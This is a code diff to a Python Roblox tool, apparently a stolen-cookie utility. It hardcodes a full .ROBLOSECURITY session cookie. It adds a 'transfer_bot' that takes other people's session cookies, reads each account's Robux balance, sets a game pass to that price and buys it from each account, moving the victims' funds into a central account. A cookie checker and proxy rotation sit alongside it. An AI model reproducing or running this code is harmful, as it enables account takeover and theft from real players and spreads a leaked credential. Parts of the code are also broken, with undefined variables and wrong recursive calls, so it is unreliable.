@@ -11,7 +11,7 @@ init()
 globalcsrf_token = None
 proxies = None
 cookies = None
-test_cookie = None
+test_cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_5AE1B37130EAA77EAA644B7EA561E935CBD1CE4FA76E524052478E7875B2F69A0F326C00CE1E9F484AAD02A7849E54FA6212AF7993695261AB1B6C8E17516C3FE4628B0F96A29FB374449E403E87522BCEF3A4F0A4578D1248643329B272E1A8627F1B78EDC1A0E096944817536E4CDECFBA9A0CE0D2E20C89A3E8BAF7360CA29849038ED99B865B5ED0266BABE4427B373506CB758C9FC2556D7D7014873E5ED5CD44E83928030457E1CF12BDAAA9DDE0F087159EDD85FAA089BC3F192CC55858EE606797AE43B0449BE7938EAD37DCF8659CE827F4CE3BB1B1402BEE8D798FCF8E84339734D92A125DF16CF74A3BD2ACCB4802CF9393667F3056BF1161B5D42F0FA381F040E4C785B4741A7D9AFE396B3A4D18C34500F8B2C0294E0BFD684A2D1BE99F8FDEC77A728083A7D268ED4D5CEF9D8D"
 
 # Init function - Zz
 def init_proxies_and_cookies():
@@ -37,8 +37,7 @@ def init_proxies_and_cookies():
 
 # Funcs
 def input_sys():
-    # print(Fore.YELLOW)
-    print(Fore.YELLOW + ">>> " + Style.RESET_ALL, end="")
+    print(f"{Fore.YELLOW}>>>{Style.RESET_ALL}", end="")
     word = input()
     return word
 
@@ -174,76 +173,152 @@ def Cookie_checker(i):
                 f.write(f"{i}\n | Robux {robux} | Email NotVerified")
 
 
+def get_all_user_games(userid: int):
+    url = "https://games.roblox.com/v2/users/175656524/games?sortOrder=Asc&limit=100"
+    data = []
+    cursor = ""
+    while cursor != None:
+        # Assumes that the response is valid
+        r = requests.get(f"{url}&cursor={cursor}").json()
+        cursor = r["nextPageCursor"]
+        data += r["data"]
+    return data
+
+
+def toggle(cookie):
+    req = requests.Session()
+    req2 = requests.Session()
+    req.cookies[".ROBLOSECURITY"] = cookie
+    r = req.get("http://www.roblox.com/mobileapi/userinfo")
+    if "mobileapi/user" not in r.url:
+        time.sleep(10)
+    else:
+        print("Cookie has been validated")
+    r = req.post("https://www.roblox.com/api/item.ashx?")
+    req.headers["X-CSRF-TOKEN"] = r.headers["X-CSRF-TOKEN"]
+
+
+def change(price: int, asset_id: int):
+    try:
+        r = requests.post(
+            f"https://itemconfiguration.roblox.com/v1/assets/{str(asset_id)}/update-price",
+            json={"priceConfiguration": {"priceInRobux": price}},
+            proxies=random.choice(proxies),
+        )
+        if "X-CSRF-TOKEN" in r.headers:
+            req.headers["X-CSRF-TOKEN"] = r.headers["X-CSRF-TOKEN"]
+            toggle(price)
+        if r.json() != {}:
+            print(r.json())
+    except:
+        change(price)
+
+
+def get_product_info(asset_id: int):
+    r = requests.get(
+        f"https://api.roblox.com/Marketplace/ProductInfo?assetId={str(asset_id)}"
+    )
+
+    if r.status_code == 200:
+        return r.json()
+    else:
+        return None
+
+
+def get_current_robux(cookie: str):
+    url = "https://api.roblox.com/users/account-info%27"
+
+    r = requests.get(url, cookies={".ROBLOSECURITY": cookie})
+
+    if r.status_code == 200:
+        return r.json()["RobuxBalance"]
+    else:
+        return None
+
+
+def buy_asset(asset_id: int, expected_price: int, cookie: str) -> bool:
+    product = get_product_info(asset_id)
+
+    productid = product["ProductId"]
+    creatorid = product["Creator"]["Id"]
+
+    url = f"https://economy.roblox.com/v1/purchases/products/{str(productid)}"
+
+    data = {
+        "expectedCurrency": 1,
+        "expectedPrice": expected_price,
+        "expectedSellerId": creatorid,
+    }
+
+    r = requests.post(url, data=data, cookies={".ROBLOSECURITY": cookie})
+
+    if r.status_code == 200:
+        return True
+
+    return False
+
+
 # Transfer bot - Zz
-def transfer_bot(recipient_cookie: str = None, target_cookies: list = None):
+def transfer_bot(
+    recipient_cookie: str = None, target_cookies: list = None, game_pass_id: int = None
+):
     """
     Transfer all robux from multiple given cookies to central account
     
     recipient_cookie: str -> Cookie to be recipient of all the robux
     target_cookies: list -> Cookies to take robux from
+    game_pass_id: int -> The asset ID for the gamepass 
+                         that will be used to transfer 
+                         the robux
     """
 
-    # IN PROGRESS
-
     if not (recipient_cookie or target_cookies):
-        print("Recipient/targets were not clarified")
+        print(
+            "["
+            + Fore.LIGHTRED_EX
+            + "!"
+            + Style.RESET_ALL
+            + "] Recipient/targets were not clarified"
+        )
         return
 
-    config_file_data = {
-        "apple": {
-            "type": "GamePass",
-            "name": "Transfer Test",
-            "description": "This is my random transfer asset",
-        }
-    }
+    if not game_pass_id:
+        print(
+            "["
+            + Fore.LIGHTRED_EX
+            + "!"
+            + Style.RESET_ALL
+            + "] GamePass ID was not clarified"
+        )
+        return
 
-    config_post_data = {
-        "AssetDetails": [
-            {"assetId": 0, "assetFileName": "config.json", "uploadAssetError": "None"}
-        ]
-    }
+    for cookie in target_cookies:
+        cookie: str
 
-    with open("config.json", "w") as f:
-        json.dump(config_file_data, fp=f)
-        print("Data loaded into file")
+        rbx = get_current_robux(cookie)
 
-    f = open("config.json", "r")
+        if not rbx:
+            print(
+                "["
+                + Fore.LIGHTRED_EX
+                + "!"
+                + Style.RESET_ALL
+                + "] Unable to get robux for the following cookie: "
+                + cookie
+            )
 
-    files = {"upload_file": f}
+        change(rbx, game_pass_id)
 
-    ck = {
-        "Cookie": ".ROBLOSECURITY=" + recipient_cookie,
-        "X-CSRF-TOKEN": getxcsrf(recipient_cookie),
-    }
-
-    print(ck)
-
-    r = requests.post(
-        "https://publish.roblox.com/v1/assets/upload",
-        cookies=ck,
-        data=config_post_data,
-        files=files,
-    )
-
-    print(r.status_code)
-    print(r.text)
-
-    f.close()
-
-    # IN PROGRESS
+        buy_asset(game_pass_id, rbx, cookie)
 
 
 # Start Screen
 def StartScreen():
     clearscreen()
-    print(
-        Fore.MAGENTA
-        + """
-    ███████████████████████████████████████████████████████████████████████████████████████████████████████████"""
-    )
-    print(
-        Fore.LIGHTMAGENTA_EX
-        + """
+
+    snd = f"""
+    {Fore.MAGENTA}███████████████████████████████████████████████████████████████████████████████████████████████████████████{Fore.RESET}
+    {Fore.LIGHTMAGENTA_EX}
     VVVVVVVV           VVVVVVVV  iiii                             tttt          lllllll
     V::::::V           V::::::V i::::i                         ttt:::t          l:::::l
     V::::::V           V::::::V  iiii                          t:::::t          l:::::l
@@ -260,13 +335,11 @@ def StartScreen():
               V:::::V          i::::::i  n::::n    n::::n      tt::::::::::::::tl::::::l e::::::::eeeeeeee
                V:::V           i::::::i  n::::n    n::::n        tt:::::::::::ttl::::::l  ee:::::::::::::e
                 VVV            iiiiiiii  nnnnnn    nnnnnn          ttttttttttt  llllllll   eeeeeeeeeeeeee
-                """
-    )
-    print(
-        Fore.MAGENTA
-        + """
-    ███████████████████████████████████████████████████████████████████████████████████████████████████████████"""
-    )
+    {Fore.RESET}
+    {Fore.MAGENTA}███████████████████████████████████████████████████████████████████████████████████████████████████████████{Fore.RESET}
+    """
+
+    print(snd)
 
 
 # Favourite Bot
@@ -315,5 +388,3 @@ def favorite(i):
 
 
 # dont Put the inputs in a function
-
-init_proxies_and_cookies()
